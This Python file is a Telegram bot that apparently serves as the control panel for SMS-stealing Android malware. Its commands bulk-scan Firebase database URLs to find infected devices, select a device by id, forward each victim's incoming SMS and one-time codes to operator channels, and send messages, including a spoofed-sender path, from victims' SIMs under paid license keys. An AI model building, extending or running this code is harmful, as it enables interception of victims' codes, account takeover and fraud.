import asyncio
import logging
import time
from datetime import datetime, timezone

from sqlalchemy.orm import Session
from telegram import Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

from app.config import get_settings
from app.database import Device, MonitorProfile, SMSMessage, SessionLocal
from app.bulk_firebase import bulk_import_from_txt
from app.channel_relay import (
    get_profile_by_channel,
    queue_channel_sms_with_firebase,
    queue_manual_sms_with_firebase,
)
from app.firebase_sync import forward_incoming_to_mynum, send_polling_startup_test, sync_profile_to_firebase
from app.monitor_timer import cancel_auto_stop, schedule_auto_stop
from app.device_ui import (
    device_set_keyboard,
    format_addchannel_card,
    format_device_set_card,
    format_firebase_connected_card,
    format_key_error_card,
    format_key_generated_card,
    format_key_set_card,
    format_license_key_set_card,
    format_monitoring_card,
    format_ping_card,
    format_send_queued,
    format_status_card,
    format_virtus_channel_token_card,
    format_virtus_outgoing_sent_card,
    format_virtus_startup_card,
    format_virtus_stream_card,
    STARTUP_TEST_MESSAGE,
    STARTUP_TEST_SENDER,
    format_welcome_message,
    get_sim_list,
    monitoring_keyboard,
)
from app.license_keys import generate_license_key, list_key_devices
from app.services import (
    count_old_sms,
    device_status,
    get_active_device,
    get_monitoring_user_ids,
    register_device,
    get_monitor_profile,
    resume_monitoring,
    select_sim_slot,
    connect_firebase_url,
    set_channel_id,
    set_license_key,
    show_device_by_id,
    set_user_phone,
    start_monitoring,
    stop_monitoring,
)

logger = logging.getLogger(__name__)
settings = get_settings()
AWAITING_FIREBASE_TXT = "awaiting_firebase_txt"


def is_authorized(user_id: int | None) -> bool:
    if user_id is None:
        return False
    allowed = settings.allowed_user_ids
    if not allowed:
        return True
    return user_id in allowed


def format_sms(sms: SMSMessage) -> str:
    received = sms.received_at.astimezone(timezone.utc).strftime("%d %b %Y, %H:%M UTC")
    return (
        f"📱 *Device:* `{sms.device_name}`\n"
        f"📞 *From:* `{sms.sender}`\n"
        f"🕐 *Time:* {received}\n"
        f"💬 *Message:*\n{sms.message}"
    )


def format_device_line(device: Device, sms_count: int) -> str:
    status = device_status(device)
    icon = {"online": "🟢", "idle": "🟡", "offline": "🔴", "inactive": "⚫"}.get(status, "⚪")
    last_seen = (
        device.last_seen.astimezone(timezone.utc).strftime("%d %b %H:%M")
        if device.last_seen
        else "Never"
    )
    source = " 🔥" if device.firebase_key else ""
    return f"{icon} `{device.name}`{source} — {sms_count} SMS | last: {last_seen}"


async def _post_to_channel(bot, channel_id: str, text: str) -> None:
    try:
        await bot.send_message(chat_id=channel_id, text=text, parse_mode="HTML")
    except Exception as exc:
        logger.error("Failed to post to channel %s: %s", channel_id, exc)


async def notify_new_sms(sms: SMSMessage) -> None:
    if not settings.telegram_bot_token:
        return

    t0 = time.perf_counter()

    db: Session = SessionLocal()
    try:
        monitoring_users = get_monitoring_user_ids(db, sms)
        if not monitoring_users and settings.allowed_user_ids:
            monitoring_users = settings.allowed_user_ids
    finally:
        db.close()

    if not monitoring_users:
        logger.warning("No active monitors; skipping notification")
        return

    from telegram import Bot

    bot = Bot(token=settings.telegram_bot_token)
    user_text = "🆕 *New SMS Received*\n\n" + format_sms(sms)

    # Fast path first: Firebase inject to /mynum before Telegram cards (Astik-style <1s).
    relay_targets: list[tuple[MonitorProfile, Device, str]] = []
    db = SessionLocal()
    try:
        for user_id in monitoring_users:
            profile = get_monitor_profile(db, user_id)
            device = get_active_device(db, user_id)
            if (
                profile
                and profile.is_monitoring
                and device
                and profile.phone_number
            ):
                relay_targets.append((profile, device, profile.phone_number))
        if relay_targets:
            await asyncio.gather(
                *(
                    forward_incoming_to_mynum(db, profile, device, sms.sender, sms.message)
                    for profile, device, _ in relay_targets
                ),
                return_exceptions=True,
            )
    finally:
        db.close()

    relay_ms = int((time.perf_counter() - t0) * 1000)
    stream_card = format_virtus_stream_card(
        sms.sender,
        sms.message,
        queued_ms=relay_ms or 3,
        total_ms=relay_ms + 15,
    )

    db = SessionLocal()
    try:
        notify_tasks = []
        for user_id in monitoring_users:
            notify_tasks.append(
                bot.send_message(chat_id=user_id, text=user_text, parse_mode="Markdown")
            )

            profile = get_monitor_profile(db, user_id)
            device = get_active_device(db, user_id)
            if profile and profile.is_monitoring and device:
                if profile.channel_id:
                    notify_tasks.append(_post_to_channel(bot, profile.channel_id, stream_card))
                    if profile.phone_number:
                        token_card = format_virtus_channel_token_card(
                            profile.phone_number,
                            sms.message,
                            queued_ms=relay_ms or 5,
                            total_ms=relay_ms + 20,
                        )
                        notify_tasks.append(_post_to_channel(bot, profile.channel_id, token_card))

        results = await asyncio.gather(*notify_tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, Exception):
                logger.error("Telegram notify failed: %s", result)
    finally:
        db.close()


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        await update.message.reply_text("❌ Unauthorized. Contact admin.")
        return

    await update.message.reply_text(format_welcome_message(), parse_mode="HTML")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    await update.message.reply_text(format_welcome_message(), parse_mode="HTML")


async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        await update.message.reply_text(
            "Usage: `/mynum <number>`\n\n"
            "Example:\n"
            "`/mynum 9876543210`\n"
            "`/mynum +919876543210`",
            parse_mode="Markdown",
        )
        return

    phone = context.args[0]
    db: Session = SessionLocal()
    try:
        profile, device = set_user_phone(db, user.id, phone)
        await sync_profile_to_firebase(profile, device)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    except PermissionError:
        await update.message.reply_text("❌ Ye number kisi aur user ka hai.")
        return
    finally:
        db.close()

    await update.message.reply_text(
        f"✅ Number set: `+{profile.phone_number}`\n"
        f"📱 Device: `{device.name}`\n"
        f"🔑 API key: `{device.api_key}`\n\n"
        f"Ab `/startmonitar` likho forwarding start karne ke liye.",
        parse_mode="Markdown",
    )


async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = get_monitor_profile(db, user.id)
        device = get_active_device(db, user.id)
        if not profile or not device:
            raise ValueError("Pehle /fy <device_id> aur /mynum set karo")
        license_key = (profile.license_key or "").strip().upper()
        if license_key.startswith("KEY-"):
            from app.license_keys import ensure_ready_for_monitoring

            await ensure_ready_for_monitoring(license_key, device.name)
        profile, device = start_monitoring(db, user.id)
        ignored = count_old_sms(db, device.id, profile.started_at)
        await sync_profile_to_firebase(profile, device)
        await send_polling_startup_test(db, profile, device)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored)
    startup_card = format_virtus_startup_card()
    stream_card = format_virtus_stream_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)

    await update.message.reply_text(
        monitoring_card,
        parse_mode="HTML",
        reply_markup=monitoring_keyboard(),
    )

    if profile.channel_id and settings.telegram_bot_token:
        from telegram import Bot

        bot = Bot(token=settings.telegram_bot_token)
        await _post_to_channel(bot, profile.channel_id, monitoring_card)
        await _post_to_channel(bot, profile.channel_id, startup_card)
        await _post_to_channel(bot, profile.channel_id, stream_card)

    schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)


async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if context.args:
        channel_id = context.args[0]
    elif update.effective_chat and update.effective_chat.type in ("channel", "group", "supergroup"):
        channel_id = str(update.effective_chat.id)
    else:
        await update.message.reply_text(
            "Usage: `/addchannel <channel-id>`\n\n"
            "Example:\n"
            "`/addchannel -1003553669855`\n\n"
            "Ya group/channel mein command bhejo — auto detect hoga.",
            parse_mode="Markdown",
        )
        return
    db: Session = SessionLocal()
    try:
        profile = set_channel_id(db, user.id, channel_id)
        device = get_active_device(db, user.id)
        sim_slot = 1
        if device:
            sims = get_sim_list(device)
            sim_index = profile.selected_sim_index or 0
            sim_slot = sims[sim_index]["slot"] if sims else 1
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    if profile and device:
        await sync_profile_to_firebase(profile, device)
    await update.message.reply_text(
        format_addchannel_card(channel_id, sim_slot=sim_slot),
        parse_mode="HTML",
    )


def _is_virtus_bot_message(text: str) -> bool:
    markers = (
        "INJECT FORWARDED!",
        "TOKEN FORWARDED!",
        "Real SMS ->",
        STARTUP_TEST_MESSAGE,
        "Test message sent:",
        "AUTO-STOPPED",
        "✅ SUCCESS",
    )
    return any(marker in text for marker in markers)


async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.channel_post or update.message
    if not message or not message.text:
        return

    if message.from_user and message.from_user.is_bot:
        return

    if _is_virtus_bot_message(message.text):
        return

    channel_id = str(message.chat_id)
    db: Session = SessionLocal()
    try:
        linked = get_profile_by_channel(db, channel_id)
        if not linked:
            return

        for profile, device in linked:
            try:
                relay_start = time.perf_counter()
                outbound = await queue_channel_sms_with_firebase(
                    db,
                    profile,
                    device,
                    message.text,
                    channel_message_id=message.message_id,
                )
                relay_ms = int((time.perf_counter() - relay_start) * 1000)
                if outbound.spoof_sender:
                    confirm_card = format_virtus_channel_token_card(
                        outbound.to_number,
                        outbound.message,
                        queued_ms=relay_ms or 5,
                        total_ms=relay_ms + 20,
                    )
                else:
                    confirm_card = format_virtus_outgoing_sent_card(
                        outbound.to_number,
                        outbound.message,
                        sim_slot=outbound.sim_slot,
                        queued_ms=relay_ms or 5,
                        total_ms=relay_ms + 20,
                    )
                await message.reply_text(confirm_card, parse_mode="HTML")
            except Exception as exc:
                logger.error("Channel relay failed: %s", exc)
                await message.reply_text(f"❌ Send failed: {exc}")
    finally:
        db.close()


async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = stop_monitoring(db, user.id)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    cancel_auto_stop(user.id)
    await update.message.reply_text(
        "🔴 <b>STOPPED</b>\n\n"
        "<pre>"
        "Monitor paused.\n\n"
        f"📞 Number: {profile.phone_number or 'unknown'}\n"
        "Use /resume to start again."
        "</pre>",
        parse_mode="HTML",
    )


async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    context.user_data[AWAITING_FIREBASE_TXT] = True
    await update.message.reply_text(
        "📄 <b>Bulk Firebase Import</b>\n\n"
        "Ab <code>.txt</code> file attach karo — har Firebase <b>scan</b> hoga.\n\n"
        "<b>Har line format:</b>\n"
        "<pre>"
        "https://app1-default-rtdb.firebaseio.com\n"
        "https://app2-default-rtdb.asia-south1.firebasedatabase.app\n"
        "mydevice|https://app3-default-rtdb.firebaseio.com\n"
        "deviceid,https://app4-default-rtdb.firebaseio.com"
        "</pre>\n"
        "Import ke baad: <code>/a &lt;device_id&gt;</code>\n\n"
        "Ek URL ke liye: <code>/setfirebase &lt;url&gt;</code>",
        parse_mode="HTML",
    )


async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not user or not context.user_data.get(AWAITING_FIREBASE_TXT):
        return
    if not is_authorized(user.id):
        return

    document = update.message.document
    if not document:
        return

    filename = (document.file_name or "").lower()
    if not filename.endswith(".txt"):
        await update.message.reply_text("❌ Sirf `.txt` file bhejo.")
        return

    context.user_data[AWAITING_FIREBASE_TXT] = False
    status_msg = await update.message.reply_text("⏳ Txt file read ho rahi hai — Firebase scan start...")

    try:
        telegram_file = await document.get_file()
        raw = await telegram_file.download_as_bytearray()
        content = raw.decode("utf-8", errors="ignore")
    except Exception as exc:
        await status_msg.edit_text(f"❌ File read error: {exc}")
        return

    db: Session = SessionLocal()

    async def on_progress(done: int, total: int, imported: int) -> None:
        try:
            await status_msg.edit_text(
                f"⏳ Import ho raha hai...\n"
                f"Lines: {done}/{total}\n"
                f"Devices: {imported}"
            )
        except Exception:
            pass

    try:
        result = await bulk_import_from_txt(db, content, live_fetch=True, on_progress=on_progress)
    except ValueError as exc:
        await status_msg.edit_text(f"❌ {exc}")
        return
    except Exception as exc:
        logger.error("Bulk firebase import failed: %s", exc)
        await status_msg.edit_text(f"❌ Import failed: {exc}")
        return
    finally:
        db.close()

    await status_msg.edit_text(
        "✅ <b>Firebase Scan Complete</b>\n\n"
        "<pre>"
        f"Lines: {result['lines']}\n"
        f"Devices found: {result['imported']}\n"
        f"Failed: {result['failed']}\n"
        f"Pool total: {result['pool_total']}"
        "</pre>\n"
        "Device pick: <code>/a &lt;device_id&gt;</code>\n"
        "License key: <code>/key generate</code>",
        parse_mode="HTML",
    )


async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        await update.message.reply_text(
            "🔥 <b>Firebase Connect</b>\n\n"
            "<pre>"
            "/setfirebase https://myapp-default-rtdb.firebaseio.com\n"
            "/setfirebase myapp-default-rtdb.asia-south1.firebasedatabase.app"
            "</pre>\n"
            "Devices auto-scan honge.\n\n"
            "Bulk txt (1600+): <code>/allfirebase</code> → .txt attach\n"
            "License key alag: <code>/key generate</code>",
            parse_mode="HTML",
        )
        return

    firebase_url = " ".join(context.args)
    status_msg = await update.message.reply_text("⏳ Firebase connect ho raha hai...")

    db: Session = SessionLocal()
    device = None
    try:
        profile, total, online_count = await connect_firebase_url(db, user.id, firebase_url)
        if profile.active_device_id:
            device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    except ValueError as exc:
        await status_msg.edit_text(f"❌ {exc}")
        return
    except Exception as exc:
        logger.error("Firebase connect failed: %s", exc)
        await status_msg.edit_text(f"❌ Firebase error: {exc}")
        return
    finally:
        db.close()

    await sync_profile_to_firebase(profile, device)
    await status_msg.edit_text(
        format_firebase_connected_card(profile.firebase_url or firebase_url, online_count, total),
        parse_mode="HTML",
    )


async def device_select_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Shared handler for /a /setdevice /fy /fb <device_id>"""
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        cmd = (update.message.text or "").split()[0]
        await update.message.reply_text(
            f"Usage: `{cmd} <device_id>`\n\n"
            "Example:\n"
            f"`{cmd} cac2ced675392f6c`",
            parse_mode="Markdown",
        )
        return

    deviceid = context.args[0]
    db: Session = SessionLocal()
    try:
        device, profile = await show_device_by_id(db, deviceid, user.id)
    except LookupError:
        await update.message.reply_text(
            f"❌ Device `{deviceid}` nahi mili.\n"
            f"Pehle `/setfirebase` ya `/allfirebase` use karo.",
            parse_mode="Markdown",
        )
        return
    except Exception as exc:
        logger.error("Device lookup failed: %s", exc)
        await update.message.reply_text(f"❌ Error: {exc}")
        return
    finally:
        db.close()

    await sync_profile_to_firebase(profile, device)
    await send_device_set_ui(update.message, device, profile)


async def send_device_set_ui(message, device: Device, profile: MonitorProfile | None = None) -> None:
    sim_index = profile.selected_sim_index if profile else 0
    await message.reply_text(
        format_device_set_card(device, selected_sim=sim_index),
        parse_mode="HTML",
        reply_markup=device_set_keyboard(device),
    )


async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        db: Session = SessionLocal()
        try:
            active = get_active_device(db, user.id)
            profile = get_monitor_profile(db, user.id)
            if active:
                await send_device_set_ui(update.message, active, profile)
                return
        finally:
            db.close()

    await device_select_command(update, context)


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await stopmonitar_command(update, context)


async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = get_monitor_profile(db, user.id)
        device = get_active_device(db, user.id)
        if profile and device:
            license_key = (profile.license_key or "").strip().upper()
            if license_key.startswith("KEY-"):
                from app.license_keys import ensure_ready_for_monitoring

                await ensure_ready_for_monitoring(license_key, device.name)
        profile, device = resume_monitoring(db, user.id)
        if device:
            await sync_profile_to_firebase(profile, device)
            await send_polling_startup_test(db, profile, device)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    if device:
        monitoring_card = format_monitoring_card(device, profile)
        startup_card = format_virtus_startup_card()
        stream_card = format_virtus_stream_card(STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
        await update.message.reply_text(
            monitoring_card,
            parse_mode="HTML",
            reply_markup=monitoring_keyboard(),
        )
        if profile.channel_id and settings.telegram_bot_token:
            from telegram import Bot

            bot = Bot(token=settings.telegram_bot_token)
            await _post_to_channel(bot, profile.channel_id, monitoring_card)
            await _post_to_channel(bot, profile.channel_id, startup_card)
            await _post_to_channel(bot, profile.channel_id, stream_card)
        schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)
    else:
        await update.message.reply_text("🟢 Monitor resumed!", parse_mode="HTML")


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = get_monitor_profile(db, user.id)
        device = get_active_device(db, user.id)
        sms_count = 0
        if device:
            sms_count = db.query(SMSMessage).filter(SMSMessage.device_id == device.id).count()
    finally:
        db.close()

    await update.message.reply_text(
        format_status_card(device, profile, sms_count),
        parse_mode="HTML",
    )


async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: `/send <number> <message>`\n\n"
            "Example:\n"
            "`/send 9876543210 Your OTP is 123`",
            parse_mode="Markdown",
        )
        return

    to_number = context.args[0]
    message = " ".join(context.args[1:])
    db: Session = SessionLocal()
    try:
        profile = get_monitor_profile(db, user.id)
        device = get_active_device(db, user.id)
        if not profile or not device:
            await update.message.reply_text("❌ Pehle /setdevice <id> se device select karo.")
            return
        outbound = await queue_manual_sms_with_firebase(db, profile, device, to_number, message)
        sims = get_sim_list(device)
        sim_slot = sims[profile.selected_sim_index or 0]["slot"] if sims else outbound.sim_slot
    except Exception as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    await update.message.reply_text(
        format_send_queued(to_number, message, sim_slot),
        parse_mode="HTML",
    )


async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    start = time.perf_counter()
    msg = await update.message.reply_text("🏓 Pinging...")
    latency = int((time.perf_counter() - start) * 1000)
    await msg.edit_text(format_ping_card(latency), parse_mode="HTML")


async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        await update.message.reply_text(format_key_error_card(), parse_mode="HTML")
        return

    action = context.args[0].lower()
    if action in {"generate", "gen", "genkey"}:
        try:
            new_key = await generate_license_key(user.id)
        except Exception as exc:
            logger.error("License key generate failed: %s", exc)
            await update.message.reply_text(f"❌ Key generate failed: {exc}")
            return
        await update.message.reply_text(
            format_key_generated_card(new_key),
            parse_mode="HTML",
        )
        return

    if action == "status" and len(context.args) >= 2:
        license_key = context.args[1].upper()
        devices = await list_key_devices(license_key)
        lines = [f"🔑 {license_key}", f"📱 Devices: {len(devices)}/2"]
        for device_id, meta in devices.items():
            attached = "✅ APK" if meta.get("apk_attached_at_ms") else "⏳ waiting"
            lines.append(f"• {device_id} — {attached}")
        await update.message.reply_text("\n".join(lines))
        return

    key_value = " ".join(context.args).strip()
    if key_value.startswith(("http://", "https://")) or (
        "firebaseio.com" in key_value.lower() or "firebasedatabase.app" in key_value.lower()
    ):
        await update.message.reply_text(
            "❌ Firebase URL yahan nahi.\n\n"
            "Firebase: <code>/setfirebase &lt;url&gt;</code>\n"
            "Bulk txt: <code>/allfirebase</code>\n"
            "License key: <code>/key generate</code>",
            parse_mode="HTML",
        )
        return

    db: Session = SessionLocal()
    try:
        profile, display_key, _key_type = await set_license_key(db, user.id, key_value)
    except ValueError as exc:
        if str(exc) == "use_setfirebase":
            await update.message.reply_text(
                "❌ Firebase URL <code>/key</code> se nahi set hota.\n\n"
                "Use: <code>/setfirebase &lt;url&gt;</code>\n"
                "Bulk: <code>/allfirebase</code>",
                parse_mode="HTML",
            )
        elif str(exc) == "invalid_format":
            await update.message.reply_text(format_key_error_card(), parse_mode="HTML")
        elif str(exc) == "invalid_key":
            await update.message.reply_text(
                "❌ <b>Invalid Key</b>\n\n"
                "Yeh key exist nahi karti.\n"
                "Nayi key: <code>/key generate</code>",
                parse_mode="HTML",
            )
        else:
            await update.message.reply_text(f"❌ {exc}")
        return
    except Exception as exc:
        logger.error("License key failed: %s", exc)
        await update.message.reply_text(f"❌ Error: {exc}")
        return
    finally:
        db.close()

    await update.message.reply_text(
        format_key_set_card(display_key),
        parse_mode="HTML",
    )


async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        active = get_active_device(db, user.id)
        profile = get_monitor_profile(db, user.id)
        if not active:
            await update.message.reply_text(
                "📭 Koi active device nahi.\n\n"
                "Device dekhne ke liye: `/a <deviceid>`",
                parse_mode="Markdown",
            )
            return
    finally:
        db.close()

    await send_device_set_ui(update.message, active, profile)


async def device_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("Usage: /device <device-name>")
        return

    device_name = " ".join(context.args)
    db: Session = SessionLocal()
    try:
        device = db.query(Device).filter(Device.name == device_name).first()
        if not device:
            await update.message.reply_text(
                f"❌ Device `{device_name}` nahi mili.\n/devices se list dekho.",
                parse_mode="Markdown",
            )
            return

        messages = (
            db.query(SMSMessage)
            .filter(SMSMessage.device_name == device_name)
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text(f"📭 `{device_name}` par abhi koi SMS nahi.", parse_mode="Markdown")
        return

    parts = [f"📱 *Device:* `{device_name}`\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def adddevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("Usage: /adddevice <device-name>")
        return

    device_name = " ".join(context.args)
    db: Session = SessionLocal()
    try:
        device = register_device(db, device_name)
        db.commit()
        db.refresh(device)
    finally:
        db.close()

    await update.message.reply_text(
        f"✅ Device added: `{device.name}`\n"
        f"🔑 Device API key: `{device.api_key}`\n\n"
        f"Phone par ye key use karo webhook mein.",
        parse_mode="Markdown",
    )


async def recent_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    db: Session = SessionLocal()
    try:
        messages = (
            db.query(SMSMessage)
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text("📭 No SMS messages yet.")
        return

    parts = ["📬 *Recent SMS (last 10)*\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("Usage: /search <keyword>")
        return

    keyword = " ".join(context.args).lower()
    db: Session = SessionLocal()
    try:
        messages = (
            db.query(SMSMessage)
            .filter(SMSMessage.message.ilike(f"%{keyword}%"))
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text(f"🔍 No messages found for: `{keyword}`", parse_mode="Markdown")
        return

    parts = [f"🔍 *Search results for:* `{keyword}`\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    db: Session = SessionLocal()
    try:
        total = db.query(SMSMessage).count()
        device_count = db.query(Device).count()
        latest = (
            db.query(SMSMessage)
            .order_by(SMSMessage.received_at.desc())
            .first()
        )
    finally:
        db.close()

    latest_text = "Never"
    if latest:
        latest_text = latest.received_at.astimezone(timezone.utc).strftime("%d %b %Y, %H:%M UTC")

    await update.message.reply_text(
        f"📊 *SMS Monitor Stats*\n\n"
        f"Total messages: *{total}*\n"
        f"Total devices: *{device_count}*\n"
        f"Last received: {latest_text}",
        parse_mode="Markdown",
    )


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query or not query.data:
        return

    user = query.from_user
    if not is_authorized(user.id if user else None):
        await query.answer("Unauthorized")
        return

    await query.answer()
    data = query.data
    db: Session = SessionLocal()

    try:
        if data.startswith("sim:"):
            _, device_id, sim_index = data.split(":")
            profile = select_sim_slot(db, user.id, int(sim_index))
            device = db.query(Device).filter(Device.id == int(device_id)).first()
            if device:
                await sync_profile_to_firebase(profile, device)
                await query.edit_message_text(
                    format_device_set_card(device, selected_sim=int(sim_index)),
                    parse_mode="HTML",
                    reply_markup=device_set_keyboard(device),
                )
            return

        if data.startswith("stop:"):
            profile = stop_monitoring(db, user.id)
            device = get_active_device(db, user.id)
            cancel_auto_stop(user.id)
            await sync_profile_to_firebase(profile, device)
            await query.edit_message_text("🔴 <b>STOPPED</b>\n\nMonitoring band ho gaya.", parse_mode="HTML")
            return

        if data == "monitor:stop":
            profile = stop_monitoring(db, user.id)
            device = get_active_device(db, user.id)
            cancel_auto_stop(user.id)
            await sync_profile_to_firebase(profile, device)
            await query.edit_message_text("🔴 <b>STOPPED</b>\n\nMonitoring band ho gaya.", parse_mode="HTML")
            return

        if data == "monitor:on":
            await query.answer("Monitoring already ON", show_alert=False)
    except Exception as exc:
        logger.error("Callback error: %s", exc)
        await query.edit_message_text(f"❌ Error: {exc}")
    finally:
        db.close()


def build_telegram_app() -> Application | None:
    if not settings.telegram_bot_token:
        logger.warning("TELEGRAM_BOT_TOKEN not set; Telegram bot disabled")
        return None

    app = Application.builder().token(settings.telegram_bot_token).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("mynum", mynum_command))
    app.add_handler(CommandHandler("addchannel", addchannel_command))
    channel_filter = (
        filters.ChatType.CHANNEL | filters.ChatType.GROUP | filters.ChatType.SUPERGROUP
    ) & filters.TEXT & ~filters.COMMAND
    app.add_handler(MessageHandler(channel_filter, channel_sms_handler))
    app.add_handler(CommandHandler("startmonitar", startmonitar_command))
    app.add_handler(CommandHandler("startmonitor", startmonitar_command))
    app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(CommandHandler("allfirebase", allfirebase_command))
    app.add_handler(CommandHandler("setfirebase", setfirebase_command))
    app.add_handler(MessageHandler(filters.Document.ALL, firebase_txt_upload_handler))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("resume", resume_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("send", send_command))
    app.add_handler(CommandHandler("ping", ping_command))
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(CommandHandler("fy", device_select_command))
    app.add_handler(CommandHandler("fb", device_select_command))
    app.add_handler(CommandHandler("a", a_command))
    app.add_handler(CommandHandler("setdevice", device_select_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("device", device_command))
    app.add_handler(CommandHandler("adddevice", adddevice_command))
    app.add_handler(CommandHandler("recent", recent_command))
    app.add_handler(CommandHandler("search", search_command))
    app.add_handler(CommandHandler("stats", stats_command))
    return app
